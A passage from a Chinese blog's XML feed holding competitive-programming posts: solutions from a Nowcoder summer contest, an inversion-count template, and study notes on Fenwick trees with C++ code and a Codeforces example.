id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> now = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= N; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (((i - (i - <span class="number">1</span>) * (now % n) % n) % n + n) % n &lt; now) &#123;</span><br><span class="line">                ans += j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            now = now * <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>), cin.<span class="built_in">tie</span>(<span class="number">0</span>), cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> T = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//     cin &gt;&gt; T;</span></span><br><span class="line">    <span class="keyword">while</span> (T--)</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="N-Particle-Arts"><a href="#N-Particle-Arts" class="headerlink" title="N. Particle Arts"></a>N. Particle Arts</h2><p>sigma姐姐做出来的！</p><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>给定一个数组 $n$，数组中的任意两个元素 $a,b$ 都可能产生碰撞，并形成两个新的元素 $a&amp;b$ 和 $a|b$ ，而原先的元素 $a,b$ 将消失。求若干次后该数组趋近的稳定方差是多少。</p><p>容易得到样例中最后得到的数组应为： $0\ 0\ 1\ 7\ 7$ ，即对于原数组中所有元素各位上的 $1$，都优先<strong>全部</strong>分配给稳定数组中的同一位。</p><p>采用方差公式：$\frac{n\times psum-sum\times sum}{n\times n}$</p><p>其中 $n$ 为样本数，$sum=\sum_{i=1}^{n}{x_i}$ ， $psum=\sum_{i=1}^{n}{x_i^2}$ 。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[N], b[N], cnt[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        cin &gt;&gt; a[i];</span><br><span class="line">        sum += a[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">15</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((a[i] &gt;&gt; j) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                cnt[j]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">15</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cnt[j]) &#123;</span><br><span class="line">                b[i] += (<span class="number">1</span> &lt;&lt; j);</span><br><span class="line">                cnt[j]--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> psum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        psum += b[i] * b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    ans = n * psum - sum * sum;</span><br><span class="line">    <span class="keyword">int</span> ans2 = n * n;</span><br><span class="line">    <span class="keyword">if</span> (ans == <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;0/1&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> gg = __gcd(ans, ans2);</span><br><span class="line">    ans /= gg, ans2 /= gg;</span><br><span class="line">    cout &lt;&lt; ans &lt;&lt; <span class="string">&quot;/&quot;</span> &lt;&lt; ans2 &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>), cin.<span class="built_in">tie</span>(<span class="number">0</span>), cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> T = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// cin &gt;&gt; T;</span></span><br><span class="line">    <span class="keyword">while</span> (T--)</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>冲冲冲吧，今天还算不错的！</p><!--希望和sigma一起进步，越变越好-->]]></content>
    
    
    <summary type="html">&lt;p&gt;这把依然和 sigma 姐姐打这场多校。出了4题rank300多也还可以的，该罚坐的题还是罚坐，该做的也都做了。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="多校" scheme="http://example.com/categories/icpc/%E5%A4%9A%E6%A0%A1/"/>
    
    <category term="牛客" scheme="http://example.com/categories/icpc/%E5%A4%9A%E6%A0%A1/%E7%89%9B%E5%AE%A2/"/>
    
    
  </entry>
  
  <entry>
    <title>逆序对板子</title>
    <link href="http://example.com/2022/07/29/%E9%80%86%E5%BA%8F%E5%AF%B9/"/>
    <id>http://example.com/2022/07/29/%E9%80%86%E5%BA%8F%E5%AF%B9/</id>
    <published>2022-07-28T20:00:00.000Z</published>
    <updated>2022-07-28T21:05:23.368Z</updated>
    
    <content type="html"><![CDATA[<p>来源于CF1676H2题目，遇到一个求逆序对的问题，咱也不敢问为什么能这么求啊。</p><span id="more"></span><h2 id="求逆序对"><a href="#求逆序对" class="headerlink" title="求逆序对"></a>求逆序对</h2><p>用途：给一个序列，求出逆序对，$O(log_2n)$</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t; cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> n,rez=<span class="number">0</span>;</span><br><span class="line">        cin&gt;&gt;n;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">a</span><span class="params">(n)</span>,<span class="title">T</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) cin&gt;&gt;a[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> x=a[i];x&gt;<span class="number">0</span>;x -= x&amp;-x) rez+=T[x];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> x=a[i];x&lt;=n;x+=x&amp;-x) T[x]+=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;rez&lt;&lt;<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;来源于CF1676H2题目，遇到一个求逆序对的问题，咱也不敢问为什么能这么求啊。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="板子" scheme="http://example.com/categories/icpc/%E6%9D%BF%E5%AD%90/"/>
    
    <category term="逆序对" scheme="http://example.com/categories/icpc/%E6%9D%BF%E5%AD%90/%E9%80%86%E5%BA%8F%E5%AF%B9/"/>
    
    
  </entry>
  
  <entry>
    <title>树状数组学习笔记</title>
    <link href="http://example.com/2022/07/29/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2022/07/29/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2022-07-28T19:00:00.000Z</published>
    <updated>2022-07-28T20:26:24.970Z</updated>
    
    <content type="html"><![CDATA[<p>树状数组（Fenwick Tree），这次EC Final遇到过的，英文也记一下，也来学一下，刚好半夜刷题刷到了树状数组可以解决的题目！</p><span id="more"></span><!--sigma--><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>树状数组和线段树具有相似的功能，但他俩毕竟还有一些区别：树状数组能有的操作，线段树一定有；线段树有的操作，树状数组不一定有。但是树状数组的代码要比线段树短，思维更清晰，速度也更快，在解决一些单点修改的问题时，树状数组是不二之选。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>下面这张图展示了树状数组的工作原理：</p><p><img src="/2022/07/29/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.svg" alt="1"></p><p>这个结构和线段树有些类似：用一个大节点表示一些小节点的信息，进行查询的时候只需要查询一些大节点而不是所有的小节点。</p><p>最上面的八个方块就代表数组 $a$。</p><p>他们下面的参差不齐的剩下的方块就代表数组 $a$ 的上级——$c$ 数组。</p><p>从图中可以看出：<br>$c_2$ 管理的是 $a_1$,$a_2$；<br>$c_4$ 管理的是 $a_1$,$a_2$,$a_3$,$a_4$；<br>$c_6$ 管理的是 $a_5$,$a_6$；$c_8$ 则管理全部 $8$ 个数。</p><p>如果要计算数组 $a$ 的区间和，比如说要算 $a_{51}$~$a_{91}$ 的区间和，可以采用类似倍增的思想：</p><p>从 $91$ 开始往前跳，发现 $c_n$（$n$ 我也不确定是多少，算起来太麻烦，就意思一下）只管 $a_{91}$ 这个点，那么你就会找 $a_{90}$，发现 $c_{n - 1}$ 管的是 $a_{90}$&amp;$a_{89}$；那么你就会直接跳到 $a_{88}$，$c_{n - 2}$ 就会管 $a_{81}$~$a_{88}$ 这些数，下次查询从 $a_{80}$ 往前找，以此类推。</p><h2 id="用法及操作"><a href="#用法及操作" class="headerlink" title="用法及操作"></a>用法及操作</h2><p>那么问题来了，怎么知道 $c_i$ 管理的数组 $a$ 中的哪个区间呢？<br>这时，我们引入一个函数——<code>lowbit</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// x 的二进制表示中，最低位的 1 的位置。</span></span><br><span class="line">  <span class="comment">// lowbit(0b10110000) == 0b00010000</span></span><br><span class="line">  <span class="comment">//          ~~~^~~~~</span></span><br><span class="line">  <span class="comment">// lowbit(0b11100100) == 0b00000100</span></span><br><span class="line">  <span class="comment">//          ~~~~~^~~</span></span><br><span class="line">  <span class="keyword">return</span> x &amp; -x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释说明了 <code>lowbit</code> 的意思，对于 $x=88$：$88_{(10)}=1011000_{(2)}$<br>发现第一个 $1$ 以及他后面的 $0$ 组成的二进制是 $1000$<br> $1000_{(2)} = 8_{(10)}$<br>$1000$ 对应的十进制是 $8$，所以 $c_{88}$ 一共管理 $8$ 个 $a$ 数组中的元素。</p><p>在常见的计算机中，有符号数采用补码表示。在补码表示下，数 <code>x</code> 的相反数 <code>-x = ~x + 1</code>。</p><p>使用 lowbit 函数，我们可以实现很多操作，例如单点修改，将 $a_x$ 加上 $k$，只需要更新 $a_x$ 的所有上级：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (x &lt;= n) &#123;  <span class="comment">// 不能越界</span></span><br><span class="line">    c[x] = c[x] + k;</span><br><span class="line">    x = x + <span class="built_in">lowbit</span>(x);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前缀求和：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getsum</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;  <span class="comment">// a[1]..a[x]的和</span></span><br><span class="line">  <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (x &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">    ans = ans + c[x];</span><br><span class="line">    x = x - <span class="built_in">lowbit</span>(x);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="区间加-amp-区间求和"><a href="#区间加-amp-区间求和" class="headerlink" title="区间加 &amp; 区间求和"></a>区间加 &amp; 区间求和</h2><p>若维护序列 $a$ 的差分数组 $b$，此时我们对 $a$ 的一个前缀 $r$ 求和，即 $\sum_{i=1}^{r} a_i$，由差分数组定义得 $a_i=\sum_{j=1}^i b_j$</p><p>进行推导</p><p>$$<br>\begin{aligned}<br>&amp;\sum_{i=1}^{r} a_i\=&amp;\sum_{i=1}^r\sum_{j=1}^i b_j\=&amp;\sum_{i=1}^r b_i\times(r-i+1)<br>\=&amp;\sum_{i=1}^r b_i\times (r+1)-\sum_{i=1}^r b_i\times i<br>\end{aligned}<br>$$</p><p>区间和可以用两个前缀和相减得到，因此只需要用两个树状数组分别维护 $\sum b_i$ 和 $\sum i \times b_i$，就能实现区间求和。</p><p><img src="/2022/07/29/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2.svg"></p><p>代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="keyword">int</span> t1[MAXN], t2[MAXN], n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; <span class="keyword">return</span> x &amp; (-x); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1 = k * v;</span><br><span class="line">  <span class="keyword">while</span> (k &lt;= n) &#123;</span><br><span class="line">    t1[k] += v, t2[k] += v1;</span><br><span class="line">    k += <span class="built_in">lowbit</span>(k);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getsum</span><span class="params">(<span class="keyword">int</span> *t, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (k) &#123;</span><br><span class="line">    ret += t[k];</span><br><span class="line">    k -= <span class="built_in">lowbit</span>(k);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add1</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">add</span>(l, v), <span class="built_in">add</span>(r + <span class="number">1</span>, -v);  <span class="comment">// 将区间加差分为两个前缀加</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">getsum1</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (r + <span class="number">1ll</span>) * <span class="built_in">getsum</span>(t1, r) - <span class="number">1ll</span> * l * <span class="built_in">getsum</span>(t1, l - <span class="number">1</span>) -</span><br><span class="line">         (<span class="built_in">getsum</span>(t2, r) - <span class="built_in">getsum</span>(t2, l - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h2><p>$O(n)$ 建树：</p><p>每一个节点的值是由所有与自己直接相连的儿子的值求和得到的。因此可以倒着考虑贡献，即每次确定完儿子的值后，用自己的值更新自己的直接父亲。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="comment">// O(n)建树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">    t[i] += a[i];</span><br><span class="line">    <span class="keyword">int</span> j = i + <span class="built_in">lowbit</span>(i);</span><br><span class="line">    <span class="keyword">if</span> (j &lt;= n) t[j] += t[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="区间加法-amp-单点查询"><a href="#区间加法-amp-单点查询" class="headerlink" title="区间加法&amp;单点查询"></a>区间加法&amp;单点查询</h2><p>只要把我们原来维护的数组进行差分即可。这样的话我们原来 <code>get_sum(x)</code> 的操作就会变成查询 <code>x</code> 点的值 ，因为我们维护的是差分数组，所以在区间加法的时候我们只需要对端点修改即可，复杂度都是 $O(log_2n)$。</p><p>以上大部分内容来自 OI WIKI。</p><h2 id="例题：CF1679C"><a href="#例题：CF1679C" class="headerlink" title="例题：CF1679C"></a>例题：<a href="https://codeforces.com/problemset/problem/1679/C">CF1679C</a></h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/29/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.png" alt="3"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题题面比较长，但是出的确实比较好。大概就是说给你一张 $n \times n$ 的棋盘，然后给你 3 种类型的操作。</p><ol><li>在 $(x,y)$ 中放入一辆车，保证原位置没车</li><li>在 $(x,y)$ 中取出一辆车 ，保证原位置有车</li><li>选取一块矩形，由左上角端点坐标和右下角端点坐标描述。让你判断这个矩形区域内是否都在车的攻击范围内。</li></ol><p>那么你在没有看到 $n\times n$ 有范围限制就应该能想到了，这题肯定不能存储棋盘，而要描述车的位置。1，2操作我们可以堪称是单点修改，3操作可以看成是区间查询。那么想到这两点就能很好的想到树状数组了。我们把棋盘横竖分离，横坐标建一棵树状数组，纵坐标也建一棵树状数组，那么在插入 $(x,y)$ 的时候我们就可以对横坐标的 $x$ 位置进行单点修改，纵坐标的 $y$ 进行单点修改。其实哪种叫法无所谓，你只要对应上就可以了，不必纠结横纵坐标。那么再仔细解读一下它的第三个要求，判断是否能被车都撞到，那我们很容易想到，横坐标范围都有车或者纵坐标范围都有车，那这个区域都能被车撞到，就可以了，这个区间查询我们查横纵坐标，有一方满足即可。但是需要注意，我们要做一点修改，因为假如一行上面有两辆车，而上一行恰好没有车，那么这两行显然上面那一行不能被撞到，但是因为这两行区间查询得到 $2$ 我们可能误认为它能撞到这两行，那么这显然不符合逻辑。于是我们可以另外开一个数组记录这一行（列）上面车的数量，给树状数组增加的时候我只用保证这一行（列）之前没有车就行了，同样给树状数组减少的时候我们要确保这一行（列）都没车了，才能减少。这样我们就能愉快地 AC 这题了。</p><p>这个题目出的是真的好！</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> c[maxn],d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;-x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 